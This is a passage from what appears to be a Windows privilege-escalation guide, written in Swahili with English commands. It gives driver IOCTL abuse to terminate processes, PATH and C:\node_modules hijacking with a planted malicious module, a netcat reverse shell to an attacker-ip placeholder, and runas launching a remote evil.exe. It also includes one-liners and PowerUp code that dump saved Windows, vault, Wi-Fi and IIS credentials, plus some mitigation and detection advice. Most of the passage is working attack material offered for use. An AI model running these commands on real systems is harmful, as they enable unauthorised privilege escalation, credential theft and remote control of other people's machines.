HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations kwa developers
- Weka FILE_DEVICE_SECURE_OPEN kila wakati unapounda device objects zinazokusudiwa kuzuiwa kwa DACL.
- Thibitisha muktadha wa caller kwa shughuli zenye priviliji. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au kurejesha handles.
- Weka mipaka kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa input) na uzingatie mifumo ya broker badala ya priviliji za moja kwa moja za kernel.

Mawazo ya kugundua kwa defenders
- Fuatilia ufunguaji wa device names zinazotiliwa shaka kutoka user mode (kwa mfano, \\ .\\amsdk*) na mfuatano maalum wa IOCTL unaoweza kuashiria matumizi mabaya.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na udumishe orodha zako za allow/deny.


## PATH DLL Hijacking

Ikiwa una **ruhusa za kuandika ndani ya folda iliyo kwenye PATH**, unaweza kuweza kuteka nyara DLL inayopakiwa na process na **escalate privileges**.<sup>[[2]](#references)</sup>

Kagua ruhusa za folda zote zilizo ndani ya PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Utekaji nyara wa utatuzi wa module za Node.js / Electron kupitia `C:\node_modules`

Hii ni lahaja ya **Windows uncontrolled search path** inayoathiri programu za **Node.js** na **Electron** zinapotumia import ya moja kwa moja kama `require("foo")` na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutafuta package kwa kupanda kwenye mti wa saraka na kukagua folda za `node_modules` katika kila saraka ya mzazi. Kwenye Windows, utafutaji huo unaweza kufika kwenye mzizi wa drive, kwa hivyo programu iliyoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kujaribu kutafuta kwenye:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **mtumiaji mwenye upendeleo mdogo** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` hasidi (au folda ya package) na kusubiri **mchakato wa Node/Electron wenye upendeleo wa juu** utatue utegemezi unaokosekana. Payload hutekelezwa katika muktadha wa usalama wa mchakato lengwa, kwa hivyo hali hii huwa **LPE** wakati wowote lengwa linapoendeshwa kama msimamizi, kupitia scheduled task/wrapper ya service iliyopewa ruhusa za juu, au kupitia programu ya desktop yenye upendeleo inayojiwasha kiotomatiki.

Hili hutokea mara nyingi hasa wakati:

- utegemezi umetangazwa katika `optionalDependencies`<sup>[[22]](#references)</sup>
- library ya mtu mwingine imezungushia `require("foo")` ndani ya `try/catch` na inaendelea inaposhindwa
- package iliondolewa kwenye build za production, ikaachwa wakati wa packaging, au ikashindwa kusakinishwa
- `require()` iliyo katika hatari iko ndani kabisa ya mti wa utegemezi badala ya kuwa kwenye code kuu ya programu

### Kutafuta malengo yaliyo katika hatari

Tumia **Procmon** kuthibitisha njia ya utatuzi:<sup>[[23]](#references)</sup>

- Chuja kwa `Process Name` = executable lengwa (`node.exe`, EXE ya programu ya Electron, au mchakato wa wrapper)
- Chuja kwa `Path` `contains` `node_modules`
- Zingatia `NAME NOT FOUND` na kufunguliwa kwa mafanikio kwa mwisho chini ya `C:\node_modules`

Miundo muhimu ya kukagua code katika faili za `.asar` zilizofunguliwa au chanzo cha programu:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Tambua **jina la package inayokosekana** kupitia Procmon au ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:

```powershell
mkdir C:\node_modules
```

3. Weka module kwa jina halisi linalotarajiwa:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Anzisha application ya mwathiriwa. Ikiwa application itajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano halisi ya modules za hiari zinazokosekana na zinazolingana na muundo huu ni pamoja na `bluebird` na `utf-8-validate`, lakini **technique** ndiyo sehemu inayoweza kutumika tena: tafuta **bare import** yoyote inayokosekana ambayo process ya Windows Node/Electron yenye privileges za juu itatatua.

### Mawazo ya kugundua na kuimarisha usalama

- Toa tahadhari mtumiaji anapounda `C:\node_modules` au kuandika faili/package mpya za `.js` humo.
- Tafuta processes zenye integrity ya juu zinazosomea kutoka `C:\node_modules\*`.
- Weka dependencies zote za runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Kagua code ya wahusika wengine ili kupata mifumo ya kimyakimya ya `try { require("...") } catch {}`.
- Zima ukaguzi wa hiari ikiwa library inaunga mkono hilo (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka ukaguzi wa zamani wa `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Shares

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### faili ya hosts

Angalia kompyuta nyingine zinazojulikana zilizowekwa moja kwa moja kwenye faili ya hosts.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Violesura vya Mtandao na DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Milango Wazi

Angalia **huduma zilizozuiwa** kutoka nje

```bash
netstat -ano #Opened ports?
```

Kwa listener ya ndani, linganisha PID yake na mmiliki wa process, njia ya executable, na service au scheduled task yoyote inayoianzisha. Service ya udhibiti wa mbali inaweza kutoa ufikiaji kama mtumiaji wa desktop yake tu ikiwa uthibitishaji na vidhibiti vya amri vinaruhusu. Programu maalum ya TCP inayoendeshwa chini ya akaunti yenye ruhusa za juu ni lengwa tofauti la ukaguzi: listener na njia ya binary ni vidokezo vya awali tu, ilhali njia ya memory corruption inayohitaji uthibitishaji inahitaji uchanganuzi wa binary hiyo mahususi na ingizo linaloweza kuifikia. Ikiwa port iliyo wazi inaonekana kuwa ya system process, ilinganishe na [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) kabla ya kubainisha service ya nyuma; sheria ya usambazaji peke yake haithibitishi kuwa lengwa linaweza kufikiwa au lina udhaifu.

### Jedwali la Uelekezaji

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Jedwali la ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Sheria za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha sheria, unda sheria, zima, zima...)**

Amri zaidi za kuorodhesha mtandao zipo [hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata mtumiaji wa root, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, GUI itakuuliza kama `nc` inapaswa kuruhusiwa na firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Ili kuanzisha bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda ya `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

`root` ya Linux ndani ya WSL yenyewe haikupi haki za Windows Administrator. Ikiwa utambulisho wa sasa wa Windows unaweza kusoma mfumo wa faili wa distro, kagua faili za historia ya shell (ikiwemo `/root/.bash_history`) kwa amri ambazo huenda zilirekodi vitambulisho; kupandisha ruhusa bado kunahitaji akaunti halali yenye ruhusa za juu zaidi na njia ya uthibitishaji inayoruhusiwa. Muundo wa `LocalState\rootfs` unatumika kwa usakinishaji wa zamani wa WSL; WSL 2 kwa kawaida huhifadhi distro kwenye diski pepe ya [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), kwa hiyo tambua kwanza distro na njia halisi ya hifadhi. Epuka kuchapisha maudhui ya historia wakati wa uorodheshaji wa kiotomatiki.

## Vitambulisho vya Windows

### Vitambulisho vya Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Chukulia `DefaultUserName` na `DefaultDomainName` kama muktadha wa akaunti, si credentials. Thamani isiyo tupu ya `DefaultPassword` au `AltDefaultPassword` ni matokeo ya registry yenye nenosiri la maandishi wazi. Ikiwa `AutoAdminLogon=1` lakini hakuna nenosiri la maandishi wazi linalosomeka, hilo ni kidokezo tu: [Sysinternals Autologon inaweza kuhifadhi nenosiri kama siri ya LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), na usomaji wa kawaida wa registry hauonyeshi iwapo siri hiyo ipo au inaweza kupatikana. Kagua haki za ufikiaji na usanidi halisi wa kuingia kabla ya kuripoti kufichuka kwa credential.

### Credential Manager / Windows vault

Kutoka [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji za seva, tovuti na programu nyingine ambazo **Windows** inaweza kutumia ili **kuingia kiotomatiki kwa niaba ya watumiaji**. Mwanzoni, huenda ikaonekana kana kwamba watumiaji wanaweza kuhifadhi credentials za tovuti kama Facebook, Twitter au Gmail na vivinjari viingie kiotomatiki, lakini sivyo inavyofanya kazi.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuingia kiotomatiki kwa niaba ya watumiaji. Hii inamaanisha kuwa **programu yoyote ya Windows inayohitaji credentials kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager** na Windows Vault, na kutumia credentials zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nenosiri kila mara.

Isipokuwa programu ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za rasilimali husika. Kwa hiyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za rasilimali hiyo** kutoka kwenye vault ya hifadhi chaguomsingi.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye mashine.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia hati tambulishi zilizohifadhiwa. Mfano ufuatao unaendesha faili binary ya mbali kupitia SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Kutumia `runas` ukiwa na seti ya credentials uliyopewa.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Kumbuka kwamba unaweza kutumia mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au moduli ya Powershells ya [Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi tokeni za uthibitishaji na nywila katika maandishi wazi ndani ya Universal Windows Platform (UWP) `PasswordVault` (inayoonekana pia kama `Web Credentials` katika `vaultcmd`). Eneo hili la hifadhi limetengwa kwa kila session na linaweza kusimbuliwa kwa kutumia uwezo asilia wa mfumo bila haki za usimamizi au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session amilifu ya mtumiaji ili kutoa na kusimbua papo hapo majina yote ya watumiaji na nywila zote zilizohifadhiwa katika maandishi wazi:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya usimbaji fiche wa data kwa kutumia ufunguo linganifu, na hutumiwa hasa ndani ya mfumo wa uendeshaji wa Windows kusimba kwa njia linganifu funguo za faragha zisizo linganifu. Usimbaji fiche huu hutumia siri ya mtumiaji au mfumo kuchangia kwa kiasi kikubwa katika entropy.

**DPAPI huwezesha usimbaji fiche wa funguo kupitia ufunguo linganifu unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa kikoa za mfumo.

Funguo za RSA za mtumiaji zilizosimbwa kwa kutumia DPAPI huhifadhiwa kwenye saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` huwakilisha [Kitambulisho cha Usalama](https://en.wikipedia.org/wiki/Security_Identifier) cha mtumiaji. **Ufunguo wa DPAPI, ulio katika eneo moja na ufunguo mkuu unaolinda funguo za faragha za mtumiaji kwenye faili hiyo hiyo**, kwa kawaida huwa na baiti 64 za data nasibu. (Ni muhimu kukumbuka kwamba ufikiaji wa saraka hii umezuiwa, hivyo haiwezekani kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na hoja zinazofaa (`/pvk` au `/rpc`) kuifungua.

**Faili za credentials zinazolindwa na nenosiri kuu** kwa kawaida hupatikana katika:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa ili kufungua.\
Unaweza **kutoa masterkeys nyingi za DPAPI** kutoka kwenye **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa una root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Vitambulisho vya PowerShell

**Vitambulisho vya PowerShell** mara nyingi hutumiwa kwa **scripting** na kazi za uendeshaji otomatiki kama njia rahisi ya kuhifadhi vitambulisho vilivyosimbwa kwa njia fiche. Vitambulisho hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha kwamba vinaweza kufunguliwa tu na mtumiaji yuleyule kwenye kompyuta ileile vilipoundwa.

Kitambulisho kilichohamishwa kinaweza kuwa na jina lolote la faili au njia ya `.xml`. Ikiwa script au orodha ya faili inaelekeza kwenye kimoja, tafuta saraka halisi ya wasifu wa akaunti badala ya kudhani kuwa ni `C:\Users`: [Windows inaweza kuweka wasifu mahali pengine](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Faili inayosomeka ni kidokezo tu; [Windows `Export-Clixml` huunganisha kitambulisho kilichosimbwa kwa njia fiche na mtumiaji na kompyuta iliyokihamisha](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), na akaunti yoyote iliyopatikana lazima pia iwe na ruhusa halali kwenye huduma inayolengwa. Kagua njia na ACL kwanza, bila kuchapisha thamani zilizosimbwa kwa njia fiche au zilizo wazi wakati wa kuorodhesha kwa kawaida.

Ili **kufungua** kitambulisho cha PS kutoka kwenye faili iliyokihifadhi, unaweza kufanya hivi:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Miunganisho ya RDP Iliyohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Amri Zilizotekelezwa Hivi Karibuni

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Kidhibiti cha Vitambulisho cha Remote Desktop**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Tumia module ya **Mimikatz** `dpapi::rdg` pamoja na `/masterkey` inayofaa ili **kudecrypt faili zozote za .rdg**\
Unaweza **kutoa DPAPI masterkeys nyingi** kutoka kwenye memory kwa kutumia module ya Mimikatz `sekurlsa::dpapi`

**mRemoteNG hutumia hifadhi tofauti ya connections.** Kagua XML inayosomeka chini ya `%APPDATA%\mRemoteNG` na kwenye Documents za mtumiaji, ikijumuisha faili zenye majina ya kawaida kama `config.xml`. Tambua schema ya connection na attributes za `Password` zilizosimbwa kabla ya kuchukulia faili ya XML kuwa kidokezo cha credentials. Thamani iliyohifadhiwa si password ya DPAPI/RDCMan; urejeshaji hutegemea mipangilio ya usimbaji ya faili na ikiwa custom master password ilitumika. Epuka kuchapisha thamani zilizosimbwa wakati wa enumeration pana.

**Remote Desktop Plus profile exports** pia zinaweza kusomeka katika directories za mtumiaji au shared administration folder. Export ya zamani ya `profiles.xml` ina entries za `Data/Profile` zenye vipengele vya `ProfileName`, `Password`, na `Secure`. Chukulia kipengele cha password kisicho tupu kuwa kidokezo cha credentials, bila kukichapisha au kudhani kuwa ni plaintext: [maelezo ya mtengenezaji](https://www.donkz.nl/) yanasema kuwa ulinzi wa profile unaweza kufungamanishwa na account na computer iliyoiunda, au kusanidiwa bila masharti makali sana. Thibitisha chanzo cha faili na masharti ya urejeshaji kabla ya kuitumia.

### Sticky Notes

Watu wakati mwingine huhifadhi passwords na taarifa nyingine kwenye programu za sticky-note. Programu ya Sticky Notes ya Microsoft iliyo packaged kwa kawaida huhifadhi notes kwenye `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; programu za zamani au tofauti zinaweza kutumia hifadhi nyingine za user-profile, ikijumuisha LevelDB. Tambua programu iliyosakinishwa na format ya hifadhi kabla ya kuchukulia kutokuwepo kwa faili ya SQLite kuwa hakuna notes.

Ikiwa Sticky Notes inatumia SQLite write-ahead logging, nakala ya `plum.sqlite` pekee inaweza kuacha nje notes za hivi karibuni zilizocommitiwa. Hifadhi `plum.sqlite-wal` inayolingana pamoja na nakala thabiti ya database, na ujumuishe `plum.sqlite-shm` inapopatikana; index ya shared-memory inaweza kujengwa upya, lakini WAL ni sehemu ya hali endelevu ya database. Tazama [hati za SQLite kuhusu WAL](https://www.sqlite.org/wal.html). Note iliyo na jina la account au password ni kidokezo cha credentials tu: thibitisha account, ruhusa ya access, na matumizi upya ya password kando. Rekodi iliyosimbwa ya password manager pia inahitaji decryption key yake halisi na tafsiri mahususi ya programu kabla ya kuthibitisha login yenye privileges za juu zaidi.

### AppCmd.exe

**Kumbuka kuwa ili kurejesha passwords kutoka AppCmd.exe unahitaji kuwa Administrator na kuiendesha kwenye kiwango cha High Integrity.**\
**AppCmd.exe** iko kwenye directory ya `%systemroot%\system32\inetsrv\`.\
Ikiwa faili hii ipo, inawezekana baadhi ya **credentials** zimesanidiwa na zinaweza **kurejeshwa**.

Code hii ilitolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Angalia ikiwa `C:\Windows\CCM\SCClient.exe` ipo .\
Installers **huendeshwa kwa ruhusa za SYSTEM**, nyingi zinaweza kuathiriwa na **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Faili na Registry (Credentials)

### Viashiria vya credentials za registry ya zana za usaidizi

Baadhi ya usakinishaji wa zamani wa usaidizi wa mbali huhifadhi majina ya values yanayohusiana na nywila chini ya funguo maalum za registry ya programu. Kwa mfano, `SecurityPasswordAES` ya TeamViewer ilitambulisha nywila tuli ya kipindi iliyosanidiwa katika matoleo ya kabla ya 9, kulingana na [vendor's registry-key explanation](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Kiashiria cha jina la value ni kidokezo tu cha ukaguzi: thibitisha toleo lililosakinishwa, data ya value inayosomeka, muundo wake na tabia ya sasa ya uthibitishaji kabla ya kutathmini credential hiyo. Kutumia nywila ya usaidizi wa mbali kuingia katika akaunti ya Windows yenye ruhusa za juu zaidi kunahitaji pia nywila hiyo kutumika tena kwa akaunti hiyo na uwe na idhini ya kuitumia. Usijumuishe ciphertext au nywila zilizorejeshwa kwenye matokeo ya kawaida ya enumeration.

### Lahajedwali zilizoshirikiwa zenye laha zilizolindwa

Ikiwa unashuku kwamba workbook iliyoshirikiwa na inayosomeka ina data ya akaunti, tofautisha **usimbaji fiche wa faili** na ulinzi wa worksheet au safu wima zilizofichwa. [Microsoft states](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) kwamba ulinzi wa worksheet hudhibiti uhariri na si kipengele cha usalama; peke yake haithibitishi kuwa maudhui ya workbook yamesimbwa fiche. Kagua faili husika zilizoidhinishwa pekee, na uepuke kuchapisha secrets zinazoweza kuwepo wakati wa enumeration ya jumla. Njia ya `.xlsx` inayosomeka, laha iliyolindwa au safu wima iliyofichwa pekee haithibitishi kuwa kuna credentials au kwamba akaunti yoyote ina ruhusa za juu zaidi; thibitisha data halisi na ruhusa za sasa za akaunti kando.

### Patches zilizohifadhiwa za mabadiliko ya CI server

CI server inaweza kuhifadhi mabadiliko ya source yaliyowasilishwa kwenye data directory yake hata baada ya build kukamilika. [TeamCity documents](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` kuwa eneo la kuhifadhi mabadiliko ya remote-run; data directory inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayosomeka inaweza kuhifadhi marejeo yaliyoongezwa au kuondolewa ya faili ya credential, encryption key au script inayotumia vyote viwili. Kwa mfano, workflow ya PowerShell ya `ConvertTo-SecureString -Key` inahitaji AES key pamoja na string iliyosimbwa fiche; [Microsoft documents](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kwamba key hutolewa kando. Kagua majina ya patches zinazoweza kufikiwa kwanza, kisha chunguza maudhui husika kwa idhini bila kuchapisha secrets kwenye matokeo ya kawaida ya enumeration. Njia ya patch, value iliyosimbwa fiche au rejeo la key pekee havithibitishi credential halali au ufikiaji wenye ruhusa za juu zaidi. Zuia ufikiaji wa data directory kwa ACLs na uepuke kuweka secrets kwenye mabadiliko ya build.

### Mzunguko maalum wa nywila ya local administrator

Kibadilisha nywila kilichotengenezwa ndani kinaweza kuhifadhi nywila ya local administrator iliyosimbwa fiche kwenye local service huku kikihifadhi credentials za datastore kwenye faili ya `.env` inayosomeka au kando ya binary ya updater. Kagua scheduled task ya updater, akaunti, ACLs za usanidi, listener na ruhusa za datastore kwa pamoja. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na local user mwenye credentials halali, lakini uthibitishaji pekee hauthibitishi ruhusa ya kusoma rekodi husika. Ikiwa encryption seed au key material inaweza kufikiwa kando ya ciphertext, kagua key derivation halisi kabla ya kuamini usimbaji fiche huo. Mbinu inayotengeneza AES key kwa njia ya deterministiki kutokana na seed iliyofichuka kwa kutumia Go's [`math/rand`](https://pkg.go.dev/math/rand) haifai kulinda nywila hiyo; Go inaeleza kuwa kifurushi hicho hakifai kwa randomness inayohusu usalama. Thibitisha kuwa nywila yoyote iliyorejeshwa bado ni halali na ni ya akaunti iliyo katika kikundi cha local Administrators kabla ya kuichukulia kama njia ya kupata ruhusa za juu zaidi. Scheduled task, njia ya `.env` au blob iliyosimbwa fiche pekee havithibitishi masharti hayo. Usijumuishe nywila na key material kwenye matokeo ya kawaida ya enumeration.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kudhibiti nywila za local administrator. Hifadhi yake inayotegemea directory au Entra na vidhibiti vya ufikiaji ni tofauti na local datastore maalum; vivyo hivyo, [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) huamua kama mtumiaji wa datastore aliyethibitishwa anaweza kusoma index mahususi.

### JAR archives za plugin za Java server na matumizi tena ya credentials

